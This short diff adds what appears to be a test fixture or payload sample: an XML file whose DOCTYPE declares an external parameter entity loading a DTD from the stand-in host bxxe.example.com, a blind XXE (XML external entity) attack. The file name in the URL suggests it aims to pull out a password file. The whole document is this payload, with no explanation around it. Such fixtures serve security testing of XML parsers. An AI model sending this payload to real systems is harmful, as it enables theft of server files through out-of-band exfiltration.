@@ -1,0 +1,2 @@
+<!DOCTYPE test [<!ENTITY % blind SYSTEM "http://bxxe.example.com/bxxepasswd.dtd"> %blind;]>
+<x></x>
